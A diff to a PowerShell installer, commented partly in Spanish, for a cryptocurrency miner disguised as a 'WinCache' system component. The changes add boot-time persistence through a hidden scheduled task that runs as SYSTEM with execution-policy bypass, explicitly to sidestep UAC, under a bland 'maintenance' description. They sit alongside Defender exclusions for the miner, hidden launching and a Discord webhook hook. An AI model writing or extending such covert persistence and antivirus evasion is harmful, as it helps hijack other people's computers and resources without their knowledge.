@@ -33,9 +33,8 @@ $LogDir  = Join-Path $Root 'logs'
 $CfgPath = Join-Path $Root 'config.json'
 $ExePath = Join-Path $Root 'WinCache.exe'
 $SelfPs  = Join-Path $Root 'WinCache.ps1'
-$BatPath = Join-Path $Root 'WinCache.bat'
-$BootLog = Join-Path $LogDir 'boot.log'
 $LogFile = Join-Path $LogDir 'miner.log'
+$TaskName = 'WinCacheAgent'
 $scriptPath = $PSCommandPath
 if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
 
@@ -97,9 +96,7 @@ if ($Diagnose) {
     Line 'config.json' (Test-Path $CfgPath)
     Line 'WinCache.exe'(Test-Path $ExePath)
     Line 'WinCache.ps1'(Test-Path $SelfPs)
-    Line 'WinCache.bat'(Test-Path $BatPath)
     Line 'miner.log'   $LogFile
-    Line 'boot.log'    $BootLog
 
     Section 'Config'
     if (Test-Path $CfgPath) {
@@ -113,14 +110,22 @@ if ($Diagnose) {
         Write-Host '  config.json no existe.' -ForegroundColor Yellow
     }
 
-    Section 'Startup folder'
+    Section 'Scheduled Task'
+    $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
+    if ($task) {
+        Line 'Task Name' $task.TaskName
+        Line 'State'     $task.State
+    } else {
+        Write-Host '  No hay tarea programada activa.' -ForegroundColor Yellow
+    }
+
+    Section 'Startup folder (Legacy)'
     $startup = [Environment]::GetFolderPath('Startup')
-    Line 'Startup path' $startup
     $entries = Get-ChildItem $startup -Filter 'WinCache*' -ErrorAction SilentlyContinue
     if ($entries) {
         foreach ($e in $entries) { Line $e.Name $e.FullName }
     } else {
-        Write-Host '  No hay entrada de Startup.' -ForegroundColor Yellow
+        Write-Host '  No hay entradas legacy en Startup.' -ForegroundColor Green
     }
 
     Section 'Defender exclusions'
@@ -158,13 +163,6 @@ if ($Diagnose) {
         Write-Host '  (miner.log no existe)' -ForegroundColor Yellow
     }
 
-    Section 'Last 15 lines of boot.log'
-    if (Test-Path $BootLog) {
-        Get-Content $BootLog -Tail 15 | ForEach-Object { Write-Host "  $_" }
-    } else {
-        Write-Host '  (boot.log no existe - el .bat no ha corrido todavía)' -ForegroundColor Yellow
-    }
-
     Write-Host ''
     return
 }
@@ -197,13 +195,20 @@ if ($Uninstall) {
     Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
         Where-Object { $_.CommandLine -like '*WinCache.ps1*' } |
         ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+    
+    # Remove Scheduled Task
+    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
+    
+    # Clean legacy startup folder items
     $startup = [Environment]::GetFolderPath('Startup')
     Get-ChildItem $startup -Filter 'WinCache*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    
     try {
         Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
         Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
     } catch {}
-    Write-Host '[+] Miner stopped, startup entry removed, exclusions cleared.'
+    
+    Write-Host '[+] Miner stopped, scheduled task removed, startup entries cleared, exclusions cleared.'
     Write-Host "[*] Files remain at: $Root"
     return
 }
@@ -397,9 +402,6 @@ if ($scriptPath -ne $SelfPs) {
     Copy-Item $scriptPath $SelfPs -Force
     Unblock-File $SelfPs -ErrorAction SilentlyContinue
 
-    # Guard: si lo copiado no es PowerShell válido, abortamos antes de dejar
-    # un watcher roto en Startup. Evita el bug de "el .bat se copia encima
-    # del .ps1 y en el siguiente login explota con CommandNotFoundException".
     $head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
     if ($head -notmatch '^#Requires' -and $head -notmatch '^<#' -and $head -notmatch '^\[CmdletBinding') {
         Remove-Item $SelfPs -Force -ErrorAction SilentlyContinue
@@ -408,52 +410,27 @@ if ($scriptPath -ne $SelfPs) {
     Write-Host "[+] Installed $SelfPs"
 }
 
-# ---------- startup BAT -----------------------------------------------------
-$bat = @"
-@echo off
-setlocal EnableExtensions
+# ---------- scheduled task --------------------------------------------------
+Write-Host '[*] Registrando tarea programada de inicio...'
+Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
-set "ROOT=$Root"
-set "LOGDIR=%ROOT%\logs"
-set "BOOTLOG=%LOGDIR%\boot.log"
-set "SELF=%ROOT%\WinCache.ps1"
+$psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Run -NoElevate"
+$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $psArgs
+$Trigger = New-ScheduledTaskTrigger -AtStartup
+$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
 
-if not exist "%LOGDIR%" mkdir "%LOGDIR%" >nul 2>&1
-echo [%date% %time%] boot.bat invoked (arg=%1) >> "%BOOTLOG%"
+# Se ejecuta como SYSTEM para evitar UAC y arrancar antes del login
+$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-if /i "%~1"=="hidden" goto :launch
+Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "Mantenimiento en segundo plano de WinCache" | Out-Null
+Write-Host "[+] Auto-start instalado como Tarea Programada: $TaskName"
 
-echo [%date% %time%] relaunching hidden child >> "%BOOTLOG%"
-powershell.exe -NoProfile -Command "Start-Process -FilePath '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden" >> "%BOOTLOG%" 2>&1
-echo [%date% %time%] parent exiting, errorlevel=%errorlevel% >> "%BOOTLOG%"
-exit /b 0
-
-:launch
-echo [%date% %time%] hidden child starting >> "%BOOTLOG%"
-if not exist "%SELF%" (
-    echo [%date% %time%] ERROR: WinCache.ps1 missing at %SELF% >> "%BOOTLOG%"
-    exit /b 1
-)
-powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%SELF%" -Run -NoElevate
-echo [%date% %time%] watcher exited, errorlevel=%errorlevel% >> "%BOOTLOG%"
-exit /b 0
-"@
-Set-Content -Path $BatPath -Value $bat -Encoding ASCII
-
-# Guard: verificar que el bat escrito empieza con @echo off (sintaxis válida).
-$batHead = (Get-Content $BatPath -TotalCount 1) -replace '\s',''
-if ($batHead -ne '@echooff') {
-    throw "WinCache.bat generado no parece batch válido (primera línea: '$batHead')."
-}
-
+# Limpieza de versiones anteriores (VBS / BAT)
 $startup = [Environment]::GetFolderPath('Startup')
-$link    = Join-Path $startup 'WinCache.bat'
-Copy-Item $BatPath $link -Force
-Write-Host "[+] Auto-start installed: $link"
-
-# Por si quedó el VBS de una versión anterior, lo eliminamos.
 $oldVbs = Join-Path $startup 'WinCache.vbs'
+$oldBat = Join-Path $startup 'WinCache.bat'
 if (Test-Path $oldVbs) { Remove-Item $oldVbs -Force -ErrorAction SilentlyContinue }
+if (Test-Path $oldBat) { Remove-Item $oldBat -Force -ErrorAction SilentlyContinue }
 
 # ---------- launch watcher --------------------------------------------------
 Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
@@ -465,7 +442,6 @@ $p = $null
 if ($Foreground) {
     & $SelfPs -Run -NoElevate
 } else {
-    $psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Run -NoElevate"
     $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $psArgs -WindowStyle Hidden -PassThru
     Write-Host "[+] Watcher running (pid $($p.Id))"
 }
@@ -479,7 +455,7 @@ if ($DiscordWebhook) {
 
 Write-Host ''
 Write-Host '=================================================='
-Write-Host '  Mining in background. Auto-start enabled.'
+Write-Host '  Mining in background. Auto-start enabled via Task Scheduler.'
 Write-Host "  Install : $Root"
 Write-Host "  Log     : $LogFile"
 Write-Host ''
